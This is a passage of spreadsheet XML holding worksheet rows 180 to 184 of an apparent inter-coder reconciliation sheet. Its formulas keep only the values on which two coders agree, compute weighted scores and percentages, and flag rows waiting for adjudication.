      <c r="A180" s="11">
        <f>Coder1!A180</f>
        <v/>
      </c>
      <c r="B180" s="11">
        <f>Coder1!B180</f>
        <v/>
      </c>
      <c r="C180" s="11">
        <f>Coder1!C180</f>
        <v/>
      </c>
      <c r="D180" s="11">
        <f>Coder1!D180</f>
        <v/>
      </c>
      <c r="E180" s="14">
        <f>IF(AND(Coder1!E180&amp;""&lt;&gt;"",Coder1!E180&amp;""=Coder2!E180&amp;""),Coder1!E180,"")</f>
        <v/>
      </c>
      <c r="F180" s="14">
        <f>IF(AND(Coder1!F180&amp;""&lt;&gt;"",Coder1!F180&amp;""=Coder2!F180&amp;""),Coder1!F180,"")</f>
        <v/>
      </c>
      <c r="G180" s="14">
        <f>IF(AND(Coder1!G180&amp;""&lt;&gt;"",Coder1!G180&amp;""=Coder2!G180&amp;""),Coder1!G180,"")</f>
        <v/>
      </c>
      <c r="H180" s="14">
        <f>IF(AND(Coder1!H180&amp;""&lt;&gt;"",Coder1!H180&amp;""=Coder2!H180&amp;""),Coder1!H180,"")</f>
        <v/>
      </c>
      <c r="I180" s="14">
        <f>IF(AND(Coder1!I180&amp;""&lt;&gt;"",Coder1!I180&amp;""=Coder2!I180&amp;""),Coder1!I180,"")</f>
        <v/>
      </c>
      <c r="J180" s="14">
        <f>IF(AND(Coder1!J180&amp;""&lt;&gt;"",Coder1!J180&amp;""=Coder2!J180&amp;""),Coder1!J180,"")</f>
        <v/>
      </c>
      <c r="K180" s="14">
        <f>IF(AND(Coder1!K180&amp;""&lt;&gt;"",Coder1!K180&amp;""=Coder2!K180&amp;""),Coder1!K180,"")</f>
        <v/>
      </c>
      <c r="L180" s="14">
        <f>IF(AND(Coder1!L180&amp;""&lt;&gt;"",Coder1!L180&amp;""=Coder2!L180&amp;""),Coder1!L180,"")</f>
        <v/>
      </c>
      <c r="M180" s="14">
        <f>IF(AND(Coder1!M180&amp;""&lt;&gt;"",Coder1!M180&amp;""=Coder2!M180&amp;""),Coder1!M180,"")</f>
        <v/>
      </c>
      <c r="N180" s="14">
        <f>IF(AND(Coder1!N180&amp;""&lt;&gt;"",Coder1!N180&amp;""=Coder2!N180&amp;""),Coder1!N180,"")</f>
        <v/>
      </c>
      <c r="O180" s="14">
        <f>IF(AND(Coder1!O180&amp;""&lt;&gt;"",Coder1!O180&amp;""=Coder2!O180&amp;""),Coder1!O180,"")</f>
        <v/>
      </c>
      <c r="P180" s="14">
        <f>IF(AND(Coder1!P180&amp;""&lt;&gt;"",Coder1!P180&amp;""=Coder2!P180&amp;""),Coder1!P180,"")</f>
        <v/>
      </c>
      <c r="Q180" s="14">
        <f>IF(AND(Coder1!Q180&amp;""&lt;&gt;"",Coder1!Q180&amp;""=Coder2!Q180&amp;""),Coder1!Q180,"")</f>
        <v/>
      </c>
      <c r="R180" s="14">
        <f>IF(AND(Coder1!R180&amp;""&lt;&gt;"",Coder1!R180&amp;""=Coder2!R180&amp;""),Coder1!R180,"")</f>
        <v/>
      </c>
      <c r="S180" s="14">
        <f>IF(AND(Coder1!S180&amp;""&lt;&gt;"",Coder1!S180&amp;""=Coder2!S180&amp;""),Coder1!S180,"")</f>
        <v/>
      </c>
      <c r="T180" s="14">
        <f>IF(AND(Coder1!T180&amp;""&lt;&gt;"",Coder1!T180&amp;""=Coder2!T180&amp;""),Coder1!T180,"")</f>
        <v/>
      </c>
      <c r="U180" s="14">
        <f>IF(AND(Coder1!U180&amp;""&lt;&gt;"",Coder1!U180&amp;""=Coder2!U180&amp;""),Coder1!U180,"")</f>
        <v/>
      </c>
      <c r="V180" s="14">
        <f>IF(AND(Coder1!V180&amp;""&lt;&gt;"",Coder1!V180&amp;""=Coder2!V180&amp;""),Coder1!V180,"")</f>
        <v/>
      </c>
      <c r="W180" s="14">
        <f>IF(AND(Coder1!W180&amp;""&lt;&gt;"",Coder1!W180&amp;""=Coder2!W180&amp;""),Coder1!W180,"")</f>
        <v/>
      </c>
      <c r="X180" s="14">
        <f>IF(AND(Coder1!X180&amp;""&lt;&gt;"",Coder1!X180&amp;""=Coder2!X180&amp;""),Coder1!X180,"")</f>
        <v/>
      </c>
      <c r="Y180" s="14">
        <f>IF(AND(Coder1!Y180&amp;""&lt;&gt;"",Coder1!Y180&amp;""=Coder2!Y180&amp;""),Coder1!Y180,"")</f>
        <v/>
      </c>
      <c r="Z180" s="14">
        <f>IF(AND(Coder1!Z180&amp;""&lt;&gt;"",Coder1!Z180&amp;""=Coder2!Z180&amp;""),Coder1!Z180,"")</f>
        <v/>
      </c>
      <c r="AA180" s="14">
        <f>IF(AND(Coder1!AA180&amp;""&lt;&gt;"",Coder1!AA180&amp;""=Coder2!AA180&amp;""),Coder1!AA180,"")</f>
        <v/>
      </c>
      <c r="AB180" s="14">
        <f>IF(AND(Coder1!AB180&amp;""&lt;&gt;"",Coder1!AB180&amp;""=Coder2!AB180&amp;""),Coder1!AB180,"")</f>
        <v/>
      </c>
      <c r="AC180" s="14">
        <f>IF(AND(Coder1!AC180&amp;""&lt;&gt;"",Coder1!AC180&amp;""=Coder2!AC180&amp;""),Coder1!AC180,"")</f>
        <v/>
      </c>
      <c r="AD180" s="14">
        <f>IF(AND(Coder1!AD180&amp;""&lt;&gt;"",Coder1!AD180&amp;""=Coder2!AD180&amp;""),Coder1!AD180,"")</f>
        <v/>
      </c>
      <c r="AE180" s="14">
        <f>IF(AND(Coder1!AE180&amp;""&lt;&gt;"",Coder1!AE180&amp;""=Coder2!AE180&amp;""),Coder1!AE180,"")</f>
        <v/>
      </c>
      <c r="AF180" s="14">
        <f>IF(AND(Coder1!AF180&amp;""&lt;&gt;"",Coder1!AF180&amp;""=Coder2!AF180&amp;""),Coder1!AF180,"")</f>
        <v/>
      </c>
      <c r="AG180" s="14">
        <f>IF(AND(Coder1!AG180&amp;""&lt;&gt;"",Coder1!AG180&amp;""=Coder2!AG180&amp;""),Coder1!AG180,"")</f>
        <v/>
      </c>
      <c r="AH180" s="14">
        <f>IF(AND(Coder1!AH180&amp;""&lt;&gt;"",Coder1!AH180&amp;""=Coder2!AH180&amp;""),Coder1!AH180,"")</f>
        <v/>
      </c>
      <c r="AI180" s="11">
        <f>IF(COUNT(E180:L180)=0,"",SUM(E180:L180))</f>
        <v/>
      </c>
      <c r="AJ180" s="11">
        <f>IF(AI180="","",N(E180)*3+N(F180)*2+N(G180)*2+N(H180)*2+N(I180)*2+N(J180)*3+N(K180)*3+N(L180)*3)</f>
        <v/>
      </c>
      <c r="AK180" s="11">
        <f>IF(AI180="","",COUNTIF(N180:AG180,1))</f>
        <v/>
      </c>
      <c r="AL180" s="11">
        <f>IF(OR(AJ180="",AJ180=0),"",ROUND(100*(AJ180-AK180)/AJ180,1))</f>
        <v/>
      </c>
      <c r="AM180" s="11">
        <f>IF(AND(Coder1!AN180=1,Coder2!AN180=1),IF(COUNTBLANK(E180:AH180)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN180" s="11">
        <f>IF(AND(Coder1!AN180=1,Coder2!AN180=1),IF(SUMPRODUCT(--(Coder1!E180:AH180&amp;""&lt;&gt;Coder2!E180:AH180&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO180" s="11" t="n"/>
    </row>
    <row r="181">
      <c r="A181" s="11">
        <f>Coder1!A181</f>
        <v/>
      </c>
      <c r="B181" s="11">
        <f>Coder1!B181</f>
        <v/>
      </c>
      <c r="C181" s="11">
        <f>Coder1!C181</f>
        <v/>
      </c>
      <c r="D181" s="11">
        <f>Coder1!D181</f>
        <v/>
      </c>
      <c r="E181" s="14">
        <f>IF(AND(Coder1!E181&amp;""&lt;&gt;"",Coder1!E181&amp;""=Coder2!E181&amp;""),Coder1!E181,"")</f>
        <v/>
      </c>
      <c r="F181" s="14">
        <f>IF(AND(Coder1!F181&amp;""&lt;&gt;"",Coder1!F181&amp;""=Coder2!F181&amp;""),Coder1!F181,"")</f>
        <v/>
      </c>
      <c r="G181" s="14">
        <f>IF(AND(Coder1!G181&amp;""&lt;&gt;"",Coder1!G181&amp;""=Coder2!G181&amp;""),Coder1!G181,"")</f>
        <v/>
      </c>
      <c r="H181" s="14">
        <f>IF(AND(Coder1!H181&amp;""&lt;&gt;"",Coder1!H181&amp;""=Coder2!H181&amp;""),Coder1!H181,"")</f>
        <v/>
      </c>
      <c r="I181" s="14">
        <f>IF(AND(Coder1!I181&amp;""&lt;&gt;"",Coder1!I181&amp;""=Coder2!I181&amp;""),Coder1!I181,"")</f>
        <v/>
      </c>
      <c r="J181" s="14">
        <f>IF(AND(Coder1!J181&amp;""&lt;&gt;"",Coder1!J181&amp;""=Coder2!J181&amp;""),Coder1!J181,"")</f>
        <v/>
      </c>
      <c r="K181" s="14">
        <f>IF(AND(Coder1!K181&amp;""&lt;&gt;"",Coder1!K181&amp;""=Coder2!K181&amp;""),Coder1!K181,"")</f>
        <v/>
      </c>
      <c r="L181" s="14">
        <f>IF(AND(Coder1!L181&amp;""&lt;&gt;"",Coder1!L181&amp;""=Coder2!L181&amp;""),Coder1!L181,"")</f>
        <v/>
      </c>
      <c r="M181" s="14">
        <f>IF(AND(Coder1!M181&amp;""&lt;&gt;"",Coder1!M181&amp;""=Coder2!M181&amp;""),Coder1!M181,"")</f>
        <v/>
      </c>
      <c r="N181" s="14">
        <f>IF(AND(Coder1!N181&amp;""&lt;&gt;"",Coder1!N181&amp;""=Coder2!N181&amp;""),Coder1!N181,"")</f>
        <v/>
      </c>
      <c r="O181" s="14">
        <f>IF(AND(Coder1!O181&amp;""&lt;&gt;"",Coder1!O181&amp;""=Coder2!O181&amp;""),Coder1!O181,"")</f>
        <v/>
      </c>
      <c r="P181" s="14">
        <f>IF(AND(Coder1!P181&amp;""&lt;&gt;"",Coder1!P181&amp;""=Coder2!P181&amp;""),Coder1!P181,"")</f>
        <v/>
      </c>
      <c r="Q181" s="14">
        <f>IF(AND(Coder1!Q181&amp;""&lt;&gt;"",Coder1!Q181&amp;""=Coder2!Q181&amp;""),Coder1!Q181,"")</f>
        <v/>
      </c>
      <c r="R181" s="14">
        <f>IF(AND(Coder1!R181&amp;""&lt;&gt;"",Coder1!R181&amp;""=Coder2!R181&amp;""),Coder1!R181,"")</f>
        <v/>
      </c>
      <c r="S181" s="14">
        <f>IF(AND(Coder1!S181&amp;""&lt;&gt;"",Coder1!S181&amp;""=Coder2!S181&amp;""),Coder1!S181,"")</f>
        <v/>
      </c>
      <c r="T181" s="14">
        <f>IF(AND(Coder1!T181&amp;""&lt;&gt;"",Coder1!T181&amp;""=Coder2!T181&amp;""),Coder1!T181,"")</f>
        <v/>
      </c>
      <c r="U181" s="14">
        <f>IF(AND(Coder1!U181&amp;""&lt;&gt;"",Coder1!U181&amp;""=Coder2!U181&amp;""),Coder1!U181,"")</f>
        <v/>
      </c>
      <c r="V181" s="14">
        <f>IF(AND(Coder1!V181&amp;""&lt;&gt;"",Coder1!V181&amp;""=Coder2!V181&amp;""),Coder1!V181,"")</f>
        <v/>
      </c>
      <c r="W181" s="14">
        <f>IF(AND(Coder1!W181&amp;""&lt;&gt;"",Coder1!W181&amp;""=Coder2!W181&amp;""),Coder1!W181,"")</f>
        <v/>
      </c>
      <c r="X181" s="14">
        <f>IF(AND(Coder1!X181&amp;""&lt;&gt;"",Coder1!X181&amp;""=Coder2!X181&amp;""),Coder1!X181,"")</f>
        <v/>
      </c>
      <c r="Y181" s="14">
        <f>IF(AND(Coder1!Y181&amp;""&lt;&gt;"",Coder1!Y181&amp;""=Coder2!Y181&amp;""),Coder1!Y181,"")</f>
        <v/>
      </c>
      <c r="Z181" s="14">
        <f>IF(AND(Coder1!Z181&amp;""&lt;&gt;"",Coder1!Z181&amp;""=Coder2!Z181&amp;""),Coder1!Z181,"")</f>
        <v/>
      </c>
      <c r="AA181" s="14">
        <f>IF(AND(Coder1!AA181&amp;""&lt;&gt;"",Coder1!AA181&amp;""=Coder2!AA181&amp;""),Coder1!AA181,"")</f>
        <v/>
      </c>
      <c r="AB181" s="14">
        <f>IF(AND(Coder1!AB181&amp;""&lt;&gt;"",Coder1!AB181&amp;""=Coder2!AB181&amp;""),Coder1!AB181,"")</f>
        <v/>
      </c>
      <c r="AC181" s="14">
        <f>IF(AND(Coder1!AC181&amp;""&lt;&gt;"",Coder1!AC181&amp;""=Coder2!AC181&amp;""),Coder1!AC181,"")</f>
        <v/>
      </c>
      <c r="AD181" s="14">
        <f>IF(AND(Coder1!AD181&amp;""&lt;&gt;"",Coder1!AD181&amp;""=Coder2!AD181&amp;""),Coder1!AD181,"")</f>
        <v/>
      </c>
      <c r="AE181" s="14">
        <f>IF(AND(Coder1!AE181&amp;""&lt;&gt;"",Coder1!AE181&amp;""=Coder2!AE181&amp;""),Coder1!AE181,"")</f>
        <v/>
      </c>
      <c r="AF181" s="14">
        <f>IF(AND(Coder1!AF181&amp;""&lt;&gt;"",Coder1!AF181&amp;""=Coder2!AF181&amp;""),Coder1!AF181,"")</f>
        <v/>
      </c>
      <c r="AG181" s="14">
        <f>IF(AND(Coder1!AG181&amp;""&lt;&gt;"",Coder1!AG181&amp;""=Coder2!AG181&amp;""),Coder1!AG181,"")</f>
        <v/>
      </c>
      <c r="AH181" s="14">
        <f>IF(AND(Coder1!AH181&amp;""&lt;&gt;"",Coder1!AH181&amp;""=Coder2!AH181&amp;""),Coder1!AH181,"")</f>
        <v/>
      </c>
      <c r="AI181" s="11">
        <f>IF(COUNT(E181:L181)=0,"",SUM(E181:L181))</f>
        <v/>
      </c>
      <c r="AJ181" s="11">
        <f>IF(AI181="","",N(E181)*3+N(F181)*2+N(G181)*2+N(H181)*2+N(I181)*2+N(J181)*3+N(K181)*3+N(L181)*3)</f>
        <v/>
      </c>
      <c r="AK181" s="11">
        <f>IF(AI181="","",COUNTIF(N181:AG181,1))</f>
        <v/>
      </c>
      <c r="AL181" s="11">
        <f>IF(OR(AJ181="",AJ181=0),"",ROUND(100*(AJ181-AK181)/AJ181,1))</f>
        <v/>
      </c>
      <c r="AM181" s="11">
        <f>IF(AND(Coder1!AN181=1,Coder2!AN181=1),IF(COUNTBLANK(E181:AH181)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN181" s="11">
        <f>IF(AND(Coder1!AN181=1,Coder2!AN181=1),IF(SUMPRODUCT(--(Coder1!E181:AH181&amp;""&lt;&gt;Coder2!E181:AH181&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO181" s="11" t="n"/>
    </row>
    <row r="182">
      <c r="A182" s="11">
        <f>Coder1!A182</f>
        <v/>
      </c>
      <c r="B182" s="11">
        <f>Coder1!B182</f>
        <v/>
      </c>
      <c r="C182" s="11">
        <f>Coder1!C182</f>
        <v/>
      </c>
      <c r="D182" s="11">
        <f>Coder1!D182</f>
        <v/>
      </c>
      <c r="E182" s="14">
        <f>IF(AND(Coder1!E182&amp;""&lt;&gt;"",Coder1!E182&amp;""=Coder2!E182&amp;""),Coder1!E182,"")</f>
        <v/>
      </c>
      <c r="F182" s="14">
        <f>IF(AND(Coder1!F182&amp;""&lt;&gt;"",Coder1!F182&amp;""=Coder2!F182&amp;""),Coder1!F182,"")</f>
        <v/>
      </c>
      <c r="G182" s="14">
        <f>IF(AND(Coder1!G182&amp;""&lt;&gt;"",Coder1!G182&amp;""=Coder2!G182&amp;""),Coder1!G182,"")</f>
        <v/>
      </c>
      <c r="H182" s="14">
        <f>IF(AND(Coder1!H182&amp;""&lt;&gt;"",Coder1!H182&amp;""=Coder2!H182&amp;""),Coder1!H182,"")</f>
        <v/>
      </c>
      <c r="I182" s="14">
        <f>IF(AND(Coder1!I182&amp;""&lt;&gt;"",Coder1!I182&amp;""=Coder2!I182&amp;""),Coder1!I182,"")</f>
        <v/>
      </c>
      <c r="J182" s="14">
        <f>IF(AND(Coder1!J182&amp;""&lt;&gt;"",Coder1!J182&amp;""=Coder2!J182&amp;""),Coder1!J182,"")</f>
        <v/>
      </c>
      <c r="K182" s="14">
        <f>IF(AND(Coder1!K182&amp;""&lt;&gt;"",Coder1!K182&amp;""=Coder2!K182&amp;""),Coder1!K182,"")</f>
        <v/>
      </c>
      <c r="L182" s="14">
        <f>IF(AND(Coder1!L182&amp;""&lt;&gt;"",Coder1!L182&amp;""=Coder2!L182&amp;""),Coder1!L182,"")</f>
        <v/>
      </c>
      <c r="M182" s="14">
        <f>IF(AND(Coder1!M182&amp;""&lt;&gt;"",Coder1!M182&amp;""=Coder2!M182&amp;""),Coder1!M182,"")</f>
        <v/>
      </c>
      <c r="N182" s="14">
        <f>IF(AND(Coder1!N182&amp;""&lt;&gt;"",Coder1!N182&amp;""=Coder2!N182&amp;""),Coder1!N182,"")</f>
        <v/>
      </c>
      <c r="O182" s="14">
        <f>IF(AND(Coder1!O182&amp;""&lt;&gt;"",Coder1!O182&amp;""=Coder2!O182&amp;""),Coder1!O182,"")</f>
        <v/>
      </c>
      <c r="P182" s="14">
        <f>IF(AND(Coder1!P182&amp;""&lt;&gt;"",Coder1!P182&amp;""=Coder2!P182&amp;""),Coder1!P182,"")</f>
        <v/>
      </c>
      <c r="Q182" s="14">
        <f>IF(AND(Coder1!Q182&amp;""&lt;&gt;"",Coder1!Q182&amp;""=Coder2!Q182&amp;""),Coder1!Q182,"")</f>
        <v/>
      </c>
      <c r="R182" s="14">
        <f>IF(AND(Coder1!R182&amp;""&lt;&gt;"",Coder1!R182&amp;""=Coder2!R182&amp;""),Coder1!R182,"")</f>
        <v/>
      </c>
      <c r="S182" s="14">
        <f>IF(AND(Coder1!S182&amp;""&lt;&gt;"",Coder1!S182&amp;""=Coder2!S182&amp;""),Coder1!S182,"")</f>
        <v/>
      </c>
      <c r="T182" s="14">
        <f>IF(AND(Coder1!T182&amp;""&lt;&gt;"",Coder1!T182&amp;""=Coder2!T182&amp;""),Coder1!T182,"")</f>
        <v/>
      </c>
      <c r="U182" s="14">
        <f>IF(AND(Coder1!U182&amp;""&lt;&gt;"",Coder1!U182&amp;""=Coder2!U182&amp;""),Coder1!U182,"")</f>
        <v/>
      </c>
      <c r="V182" s="14">
        <f>IF(AND(Coder1!V182&amp;""&lt;&gt;"",Coder1!V182&amp;""=Coder2!V182&amp;""),Coder1!V182,"")</f>
        <v/>
      </c>
      <c r="W182" s="14">
        <f>IF(AND(Coder1!W182&amp;""&lt;&gt;"",Coder1!W182&amp;""=Coder2!W182&amp;""),Coder1!W182,"")</f>
        <v/>
      </c>
      <c r="X182" s="14">
        <f>IF(AND(Coder1!X182&amp;""&lt;&gt;"",Coder1!X182&amp;""=Coder2!X182&amp;""),Coder1!X182,"")</f>
        <v/>
      </c>
      <c r="Y182" s="14">
        <f>IF(AND(Coder1!Y182&amp;""&lt;&gt;"",Coder1!Y182&amp;""=Coder2!Y182&amp;""),Coder1!Y182,"")</f>
        <v/>
      </c>
      <c r="Z182" s="14">
        <f>IF(AND(Coder1!Z182&amp;""&lt;&gt;"",Coder1!Z182&amp;""=Coder2!Z182&amp;""),Coder1!Z182,"")</f>
        <v/>
      </c>
      <c r="AA182" s="14">
        <f>IF(AND(Coder1!AA182&amp;""&lt;&gt;"",Coder1!AA182&amp;""=Coder2!AA182&amp;""),Coder1!AA182,"")</f>
        <v/>
      </c>
      <c r="AB182" s="14">
        <f>IF(AND(Coder1!AB182&amp;""&lt;&gt;"",Coder1!AB182&amp;""=Coder2!AB182&amp;""),Coder1!AB182,"")</f>
        <v/>
      </c>
      <c r="AC182" s="14">
        <f>IF(AND(Coder1!AC182&amp;""&lt;&gt;"",Coder1!AC182&amp;""=Coder2!AC182&amp;""),Coder1!AC182,"")</f>
        <v/>
      </c>
      <c r="AD182" s="14">
        <f>IF(AND(Coder1!AD182&amp;""&lt;&gt;"",Coder1!AD182&amp;""=Coder2!AD182&amp;""),Coder1!AD182,"")</f>
        <v/>
      </c>
      <c r="AE182" s="14">
        <f>IF(AND(Coder1!AE182&amp;""&lt;&gt;"",Coder1!AE182&amp;""=Coder2!AE182&amp;""),Coder1!AE182,"")</f>
        <v/>
      </c>
      <c r="AF182" s="14">
        <f>IF(AND(Coder1!AF182&amp;""&lt;&gt;"",Coder1!AF182&amp;""=Coder2!AF182&amp;""),Coder1!AF182,"")</f>
        <v/>
      </c>
      <c r="AG182" s="14">
        <f>IF(AND(Coder1!AG182&amp;""&lt;&gt;"",Coder1!AG182&amp;""=Coder2!AG182&amp;""),Coder1!AG182,"")</f>
        <v/>
      </c>
      <c r="AH182" s="14">
        <f>IF(AND(Coder1!AH182&amp;""&lt;&gt;"",Coder1!AH182&amp;""=Coder2!AH182&amp;""),Coder1!AH182,"")</f>
        <v/>
      </c>
      <c r="AI182" s="11">
        <f>IF(COUNT(E182:L182)=0,"",SUM(E182:L182))</f>
        <v/>
      </c>
      <c r="AJ182" s="11">
        <f>IF(AI182="","",N(E182)*3+N(F182)*2+N(G182)*2+N(H182)*2+N(I182)*2+N(J182)*3+N(K182)*3+N(L182)*3)</f>
        <v/>
      </c>
      <c r="AK182" s="11">
        <f>IF(AI182="","",COUNTIF(N182:AG182,1))</f>
        <v/>
      </c>
      <c r="AL182" s="11">
        <f>IF(OR(AJ182="",AJ182=0),"",ROUND(100*(AJ182-AK182)/AJ182,1))</f>
        <v/>
      </c>
      <c r="AM182" s="11">
        <f>IF(AND(Coder1!AN182=1,Coder2!AN182=1),IF(COUNTBLANK(E182:AH182)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN182" s="11">
        <f>IF(AND(Coder1!AN182=1,Coder2!AN182=1),IF(SUMPRODUCT(--(Coder1!E182:AH182&amp;""&lt;&gt;Coder2!E182:AH182&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO182" s="11" t="n"/>
    </row>
    <row r="183">
      <c r="A183" s="11">
        <f>Coder1!A183</f>
        <v/>
      </c>
      <c r="B183" s="11">
        <f>Coder1!B183</f>
        <v/>
      </c>
      <c r="C183" s="11">
        <f>Coder1!C183</f>
        <v/>
      </c>
      <c r="D183" s="11">
        <f>Coder1!D183</f>
        <v/>
      </c>
      <c r="E183" s="14">
        <f>IF(AND(Coder1!E183&amp;""&lt;&gt;"",Coder1!E183&amp;""=Coder2!E183&amp;""),Coder1!E183,"")</f>
        <v/>
      </c>
      <c r="F183" s="14">
        <f>IF(AND(Coder1!F183&amp;""&lt;&gt;"",Coder1!F183&amp;""=Coder2!F183&amp;""),Coder1!F183,"")</f>
        <v/>
      </c>
      <c r="G183" s="14">
        <f>IF(AND(Coder1!G183&amp;""&lt;&gt;"",Coder1!G183&amp;""=Coder2!G183&amp;""),Coder1!G183,"")</f>
        <v/>
      </c>
      <c r="H183" s="14">
        <f>IF(AND(Coder1!H183&amp;""&lt;&gt;"",Coder1!H183&amp;""=Coder2!H183&amp;""),Coder1!H183,"")</f>
        <v/>
      </c>
      <c r="I183" s="14">
        <f>IF(AND(Coder1!I183&amp;""&lt;&gt;"",Coder1!I183&amp;""=Coder2!I183&amp;""),Coder1!I183,"")</f>
        <v/>
      </c>
      <c r="J183" s="14">
        <f>IF(AND(Coder1!J183&amp;""&lt;&gt;"",Coder1!J183&amp;""=Coder2!J183&amp;""),Coder1!J183,"")</f>
        <v/>
      </c>
      <c r="K183" s="14">
        <f>IF(AND(Coder1!K183&amp;""&lt;&gt;"",Coder1!K183&amp;""=Coder2!K183&amp;""),Coder1!K183,"")</f>
        <v/>
      </c>
      <c r="L183" s="14">
        <f>IF(AND(Coder1!L183&amp;""&lt;&gt;"",Coder1!L183&amp;""=Coder2!L183&amp;""),Coder1!L183,"")</f>
        <v/>
      </c>
      <c r="M183" s="14">
        <f>IF(AND(Coder1!M183&amp;""&lt;&gt;"",Coder1!M183&amp;""=Coder2!M183&amp;""),Coder1!M183,"")</f>
        <v/>
      </c>
      <c r="N183" s="14">
        <f>IF(AND(Coder1!N183&amp;""&lt;&gt;"",Coder1!N183&amp;""=Coder2!N183&amp;""),Coder1!N183,"")</f>
        <v/>
      </c>
      <c r="O183" s="14">
        <f>IF(AND(Coder1!O183&amp;""&lt;&gt;"",Coder1!O183&amp;""=Coder2!O183&amp;""),Coder1!O183,"")</f>
        <v/>
      </c>
      <c r="P183" s="14">
        <f>IF(AND(Coder1!P183&amp;""&lt;&gt;"",Coder1!P183&amp;""=Coder2!P183&amp;""),Coder1!P183,"")</f>
        <v/>
      </c>
      <c r="Q183" s="14">
        <f>IF(AND(Coder1!Q183&amp;""&lt;&gt;"",Coder1!Q183&amp;""=Coder2!Q183&amp;""),Coder1!Q183,"")</f>
        <v/>
      </c>
      <c r="R183" s="14">
        <f>IF(AND(Coder1!R183&amp;""&lt;&gt;"",Coder1!R183&amp;""=Coder2!R183&amp;""),Coder1!R183,"")</f>
        <v/>
      </c>
      <c r="S183" s="14">
        <f>IF(AND(Coder1!S183&amp;""&lt;&gt;"",Coder1!S183&amp;""=Coder2!S183&amp;""),Coder1!S183,"")</f>
        <v/>
      </c>
      <c r="T183" s="14">
        <f>IF(AND(Coder1!T183&amp;""&lt;&gt;"",Coder1!T183&amp;""=Coder2!T183&amp;""),Coder1!T183,"")</f>
        <v/>
      </c>
      <c r="U183" s="14">
        <f>IF(AND(Coder1!U183&amp;""&lt;&gt;"",Coder1!U183&amp;""=Coder2!U183&amp;""),Coder1!U183,"")</f>
        <v/>
      </c>
      <c r="V183" s="14">
        <f>IF(AND(Coder1!V183&amp;""&lt;&gt;"",Coder1!V183&amp;""=Coder2!V183&amp;""),Coder1!V183,"")</f>
        <v/>
      </c>
      <c r="W183" s="14">
        <f>IF(AND(Coder1!W183&amp;""&lt;&gt;"",Coder1!W183&amp;""=Coder2!W183&amp;""),Coder1!W183,"")</f>
        <v/>
      </c>
      <c r="X183" s="14">
        <f>IF(AND(Coder1!X183&amp;""&lt;&gt;"",Coder1!X183&amp;""=Coder2!X183&amp;""),Coder1!X183,"")</f>
        <v/>
      </c>
      <c r="Y183" s="14">
        <f>IF(AND(Coder1!Y183&amp;""&lt;&gt;"",Coder1!Y183&amp;""=Coder2!Y183&amp;""),Coder1!Y183,"")</f>
        <v/>
      </c>
      <c r="Z183" s="14">
        <f>IF(AND(Coder1!Z183&amp;""&lt;&gt;"",Coder1!Z183&amp;""=Coder2!Z183&amp;""),Coder1!Z183,"")</f>
        <v/>
      </c>
      <c r="AA183" s="14">
        <f>IF(AND(Coder1!AA183&amp;""&lt;&gt;"",Coder1!AA183&amp;""=Coder2!AA183&amp;""),Coder1!AA183,"")</f>
        <v/>
      </c>
      <c r="AB183" s="14">
        <f>IF(AND(Coder1!AB183&amp;""&lt;&gt;"",Coder1!AB183&amp;""=Coder2!AB183&amp;""),Coder1!AB183,"")</f>
        <v/>
      </c>
      <c r="AC183" s="14">
        <f>IF(AND(Coder1!AC183&amp;""&lt;&gt;"",Coder1!AC183&amp;""=Coder2!AC183&amp;""),Coder1!AC183,"")</f>
        <v/>
      </c>
      <c r="AD183" s="14">
        <f>IF(AND(Coder1!AD183&amp;""&lt;&gt;"",Coder1!AD183&amp;""=Coder2!AD183&amp;""),Coder1!AD183,"")</f>
        <v/>
      </c>
      <c r="AE183" s="14">
        <f>IF(AND(Coder1!AE183&amp;""&lt;&gt;"",Coder1!AE183&amp;""=Coder2!AE183&amp;""),Coder1!AE183,"")</f>
        <v/>
      </c>
      <c r="AF183" s="14">
        <f>IF(AND(Coder1!AF183&amp;""&lt;&gt;"",Coder1!AF183&amp;""=Coder2!AF183&amp;""),Coder1!AF183,"")</f>
        <v/>
      </c>
      <c r="AG183" s="14">
        <f>IF(AND(Coder1!AG183&amp;""&lt;&gt;"",Coder1!AG183&amp;""=Coder2!AG183&amp;""),Coder1!AG183,"")</f>
        <v/>
      </c>
      <c r="AH183" s="14">
        <f>IF(AND(Coder1!AH183&amp;""&lt;&gt;"",Coder1!AH183&amp;""=Coder2!AH183&amp;""),Coder1!AH183,"")</f>
        <v/>
      </c>
      <c r="AI183" s="11">
        <f>IF(COUNT(E183:L183)=0,"",SUM(E183:L183))</f>
        <v/>
      </c>
      <c r="AJ183" s="11">
        <f>IF(AI183="","",N(E183)*3+N(F183)*2+N(G183)*2+N(H183)*2+N(I183)*2+N(J183)*3+N(K183)*3+N(L183)*3)</f>
        <v/>
      </c>
      <c r="AK183" s="11">
        <f>IF(AI183="","",COUNTIF(N183:AG183,1))</f>
        <v/>
      </c>
      <c r="AL183" s="11">
        <f>IF(OR(AJ183="",AJ183=0),"",ROUND(100*(AJ183-AK183)/AJ183,1))</f>
        <v/>
      </c>
      <c r="AM183" s="11">
        <f>IF(AND(Coder1!AN183=1,Coder2!AN183=1),IF(COUNTBLANK(E183:AH183)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN183" s="11">
        <f>IF(AND(Coder1!AN183=1,Coder2!AN183=1),IF(SUMPRODUCT(--(Coder1!E183:AH183&amp;""&lt;&gt;Coder2!E183:AH183&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO183" s="11" t="n"/>
    </row>
    <row r="184">
      <c r="A184" s="11">
        <f>Coder1!A184</f>
        <v/>
      </c>
      <c r="B184" s="11">
        <f>Coder1!B184</f>
        <v/>
      </c>
      <c r="C184" s="11">
        <f>Coder1!C184</f>
        <v/>
      </c>
      <c r="D184" s="11">
        <f>Coder1!D184</f>
        <v/>
      </c>
      <c r="E184" s="14">
        <f>IF(AND(Coder1!E184&amp;""&lt;&gt;"",Coder1!E184&amp;""=Coder2!E184&amp;""),Coder1!E184,"")</f>
        <v/>
      </c>
      <c r="F184" s="14">
